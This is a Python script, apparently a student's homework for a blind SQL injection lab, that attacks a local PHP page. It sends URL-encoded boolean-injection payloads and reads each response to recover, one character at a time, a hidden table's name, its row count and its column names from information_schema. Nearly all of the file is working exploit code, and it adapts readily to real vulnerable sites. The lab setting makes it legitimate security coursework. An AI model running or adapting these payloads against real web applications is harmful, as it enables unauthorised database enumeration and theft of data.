# I wrote this script for the blind sqli questions, so I don't have to try a huge amount of different url
# addresses manually. It helped me a lot and made the assignment feasible. Trying so many different addresses
# manually is exhausting and I will probably lose count.

import requests

# In this function I will find the length of the name of the secret table by iteratively asking the server whether the
# length is 1, 2, etc. We do this by using the information schema table
def find_length(my_cookies):

    # At first tried range(1,20) but that was not enough!
    for i in range(1, 50):
        url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20LENGTH((SELECT%20table_name%20FROM%"
               f"20information_schema.tables%20WHERE%20table_schema=%27secure%27%20LIMIT%201))={i};--%20")

        # Getting the response
        response = requests.get(url, cookies = my_cookies)

        # If wonderland is in the text that means that the site has loaded successfully
        if "wonderland" in response.text:
            return i

    # The length is more than 20 characters
    return -1

# This function receives the length of the table and finds the name of it by trying out all the possible options in a
# blind sqli manner.
def find_name(my_cookies, length):

    # Because I assume that the name of the table is encrypted through md5, I am only going to try lowercase english
    # letters and numbers.
    # If I will be mistaken, I will change that.

    charset = "abcdefghijklmnopqrstuvwxyz0123456789"

    result = ""

    # We want the loop to iterate over the entire string including the last character
    for position in range(1, length + 1):
        found = False
        for char in charset:
            url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20SUBSTRING((SELECT%20table_name%20FROM%"
                   f"20information_schema.tables%20WHERE%20table_schema=%27secure%27%20LIMIT%201),{position},1)"
                   f"=%27{char}%27;--%20")

            response = requests.get(url, cookies = my_cookies)

            if "wonderland" in response.text:
                #print(f"The char in position {position} is {char}")
                result += char
                found = True
                break

        if not found:
            print("OH NO THIS IS NOT MD5!")
            exit(1)

    return result

# This function receives the name of the table we found and returns the number of rows in it by using blind sqli
# techniques
def find_row_count(my_cookies, name):
    for i in range(1000):
        url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20"
               f"(SELECT%20COUNT(*)%20FROM%20secure.%60{name}%60)={i};--%20")

        response = requests.get(url, cookies = my_cookies)
        if "wonderland" in response.text:
            return i

    return -1

# This function receives the name of the table we found and returns a list of the names of the columns
def find_columns(my_cookies, name):

    # I assume the name of the columns is only english characters, numbers, and underscore. I will add more characters
    # as needed
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

    columns = []

    # Which column we are looking at
    offset = 0

    # We will break
    while True:
        # The length of the current column
        current_length = -1
        current_name = ""

        # Checking what is the length of the current column (assuming it is between 1 and 50)
        for i in range(1, 51):
            url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20LENGTH((SELECT%20column_name%20FROM%"
                   f"20information_schema.columns%20WHERE%20table_name=%27{name}%27%20LIMIT%201%20OFFSET%20{offset}))"
                   f"={i};--%20")

            response = requests.get(url, cookies = my_cookies)

            if "wonderland" in response.text:
                current_length = i
                break

        # If the length of the current column is not between 1 and 50 I assume we just finished iterating over the
        # columns
        if current_length == -1:
            return columns

        for i in range(1, current_length + 1):
            found = False
            for char in charset:
                url = (
                    f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20SUBSTRING((SELECT%20column_name%20FROM%"
                    f"20information_schema.columns%20WHERE%20table_name=%27{name}%27%20LIMIT%201%20OFFSET%20{offset})"
                    f",{i},1)=%27{char}%27;--%20")

                response = requests.get(url, cookies = my_cookies)

                if "wonderland" in response.text:
                    found = True
                    current_name += char
                    break

            if not found:
                print("WEIRD CHARACTERS!")
                exit(1)

        columns.append(current_name)
        offset += 1

def main():

    # The cookie in order to log in as alice
    my_cookies = {"PHPSESSID": "INSERT_YOUR_COOKIE_HERE"}

    length = find_length(my_cookies)
    print(f"The length of the table name is: {length}")

    name = find_name(my_cookies, length)
    print(f"\nThe name of the table is: {name}")

    row_count = find_row_count(my_cookies, name)
    print(f"\nThe row count is: {row_count}")

    columns = find_columns(my_cookies, name)
    print(f"\nThe columns are: {columns}")

if __name__ == "__main__":
    main()
